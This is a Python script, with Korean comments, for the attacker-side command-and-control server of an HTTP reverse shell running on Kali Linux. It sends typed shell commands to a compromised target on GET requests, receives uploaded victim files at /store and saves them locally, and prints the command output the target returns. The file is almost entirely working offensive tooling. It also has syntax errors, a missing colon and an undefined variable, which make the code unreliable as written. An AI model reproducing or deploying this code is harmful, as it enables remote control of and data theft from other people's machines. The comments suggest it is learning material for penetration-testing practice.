from http.server import BaseHTTPRequestHandler, HTTPServer
import os,cgi
## HTTP 서버를 간단히 구현할 수 있는 모듈


## Kali 리눅스 IP와 포트 지정(공격자의 IP와 포트다)
HOST_NAME = '192.168.32.10'
PORT_NUMBER = 80

## Myhandler 클래스 시작
class MyHandler(BaseHTTPRequestHandler):

    ##GET 요청을 받았을때
    def do_GET(self):
        command = input("Shell >") ## 공격자 입력을 Command에 저장
        self.send_response(200) ## 공격대상에게 200 OK를 Return 해준다
        self.send_header("Content-Type","text/html") ##Header에 Content-type을 html 형식으로 리턴
        self.end_headers() ## 헤더 끝
        self.wfile.write(command.encode()) ## 공격자의 입력을 공격대상에게 보낸다.

    ##POST 요청을 받았을때
    def do_POST(self):
        if self.path == '/store': ##공격 대상으로부터 전달받은 경로가, /store 라면?
            try: ## 다음을 수행
                ctype,pdict = cgi.parse_header(self.headers.get('Content-Type')) ## 컨텐츠 타입과 파라미터 정보를 각각 ctype과 pdict에 저장한다.
                if ctype == 'multipart/form-data' ## 컨텐츠 타입이 multipart/form-data 라면? 즉 공격대상으로부터 파일을 가져오는 거라면?
                    fs = cgi.FieldStorage(fp=self.rfile,headers=headers,environ={'REQUEST_METHOD':'POST'}) ## 읽어드린 파일을 fs 에 저장한다.
                else: ## 아니면?
                    print("[-] Unexpected POST request") ## 에러메세지 출력
                fs_up = fs['file'] ##전달받은 파일내용을 fs_up에 저장
                with open('/home/kali/1.txt','wb') as o: ##kali 리눅스 내에 1.txt 파일(파일내용을 옮겨올..)을 연다
                    o.write(fs_up.file.read()) ##공격 대상으로부터전달 받은 파일 내용을 덮어쓰고
                    self.send_response(200) ## 공격 대상에게 200 OK 리턴
                    self.end_headers()
            except Exception as e: ## 에러 핸들링
                print(e)
            return
        self.send_response(200) ## 공격대상에게 200을 Return해주고
        self.end_headers() ## 헤더는 없음
        length = int(self.headers['content-length']) ## Content-Legth 길이를 저장, 입력받은 명령어를 온전히 다 받기 위함
        postVar = self.rfile.read(length) ## 전달 받은 데이터를 읽고, postVar 에 저장
        print(postVar.decode()) ##postVar를 출력

if __name__ == '__main__':
    server_class = HTTPServer
    server_address = (HOST_NAME,PORT_NUMBER)
    httpd = server_class(server_address,MyHandler) ## Kali 리눅스에 HTTP 서버를 구동
    try:
        print("HTTP Reverse Shell is listening....")
        httpd.serve_forever() ## Ctrl+c 가 입력되기 전까지 계속 구동해라!

    except KeyboardInterrupt: ## Ctrl+c 가 입력되면?
        print('[!] Server is terminated') ## 서버 종료
        httpd.server_close()
